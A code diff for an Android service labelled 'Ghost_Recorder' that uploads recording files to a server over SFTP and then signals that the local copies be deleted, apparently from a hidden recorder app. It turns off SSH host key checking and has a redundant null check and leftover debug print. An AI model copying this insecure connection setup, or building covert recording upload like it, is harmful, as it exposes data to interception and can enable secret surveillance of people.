@@ -81,6 +81,8 @@ public class UploadRecordingTask extends IntentService {
             } catch (IOException e) {
                 stopSelf();
             }
+        }else {
+            return;
         }
     }
 
@@ -113,12 +115,10 @@ public class UploadRecordingTask extends IntentService {
             config.put("StrictHostKeyChecking", "no");
             mSession.setConfig(config);
             mSession.connect();
+            System.out.println(mSession == null);
             Log.i("Ghost_Recorder", "Host connected.");
             mChannel = mSession.openChannel("sftp");
             mChannel.connect();
-            if (mChannel == null) {
-                stopSelf();
-            }
             Log.i("Ghost_Recorder", "sftp channel opened and connected.");
             mChannelSftp = (ChannelSftp) mChannel;
             mChannelSftp.cd(SFTP_WORKING_DIR);
@@ -127,6 +127,42 @@ public class UploadRecordingTask extends IntentService {
         } catch (SftpException e) {
             e.printStackTrace();
         }
+    }
+
+    private void uploadFileToServer(ArrayList<String> list) {
+        RecordingDatabaseHelper recordingHelper = new RecordingDatabaseHelper(getApplicationContext());
+        try {
+            /*using jsch library for sending Recording to server*/
+            for (String s : list) {
+                File file = new File(s);
+                mFileName = file.getName();
+                Log.i(AppGlobals.getLogTag(getClass()), "Current file: " + s);
+                if (mChannel == null && mChannel == null) {
+                    Log.i(AppGlobals.getLogTag(getClass()), "Not Really Connected To Server...");
+                    if (!recordingDatabaseHelper.CheckIfItemAlreadyExist(s)) {
+                        Log.i(AppGlobals.getLogTag(getClass()), "item added");
+                        recordingHelper.createNewEntry(SqliteHelpers.COULMN_UPLOAD, s);
+                    }
+                    stopSelf();
+                    return;
+                }
+                mChannelSftp.put(new FileInputStream(file), file.getName());
+                Log.i(LOG_TAG, "File transfered successfully to host.");
+                Log.i(LOG_TAG, "BroadCast sent...");
+                Intent intent = new Intent("com.byteshaft.deleteData");
+                intent.putExtra("FILE_NAME", mFileName);
+                sendBroadcast(intent);
+            }
+        } catch (SftpException e) {
+            e.printStackTrace();
+            String notUploadedFile = mHelpers.path + "/" + mFileName;
+            recordingHelper.createNewEntry(SqliteHelpers.COULMN_DELETE, mFileName);
+            recordingHelper.createNewEntry(SqliteHelpers.COULMN_UPLOAD, notUploadedFile);
+        } catch (FileNotFoundException e) {
+            e.printStackTrace();
+            recordingDatabaseHelper.deleteItem(SqliteHelpers.COULMN_UPLOAD, mHelpers.path + mFileName);
+        }
+        disconnectConnection();
     }
 
     private void disconnectConnection() {
@@ -145,34 +181,5 @@ public class UploadRecordingTask extends IntentService {
             Log.i("Server", "Host Session disconnected.");
         }
         stopSelf();
-    }
-
-
-
-    private void uploadFileToServer(ArrayList<String> list) {
-        try {
-            /*using jsch library for sending Recording to server*/
-            for (String s : list) {
-                File file = new File(s);
-                mFileName = file.getName();
-                Log.i(AppGlobals.getLogTag(getClass()), "Current file: " + s);
-                mChannelSftp.put(new FileInputStream(file), file.getName());
-                Log.i(LOG_TAG, "File transfered successfully to host.");
-                Log.i(LOG_TAG, "BroadCast sent...");
-                Intent intent = new Intent("com.byteshaft.deleteData");
-                intent.putExtra("FILE_NAME", mFileName);
-                sendBroadcast(intent);
-            }
-        } catch (SftpException e) {
-            e.printStackTrace();
-            String notUploadedFile = mHelpers.path + "/" + mFileName;
-            RecordingDatabaseHelper recordingHelper = new RecordingDatabaseHelper(getApplicationContext());
-            recordingHelper.createNewEntry(SqliteHelpers.COULMN_DELETE, mFileName);
-            recordingHelper.createNewEntry(SqliteHelpers.COULMN_UPLOAD, notUploadedFile);
-        } catch (FileNotFoundException e) {
-            e.printStackTrace();
-            recordingDatabaseHelper.deleteItem(SqliteHelpers.COULMN_UPLOAD, mHelpers.path + mFileName);
-        }
-        disconnectConnection();
     }
 }
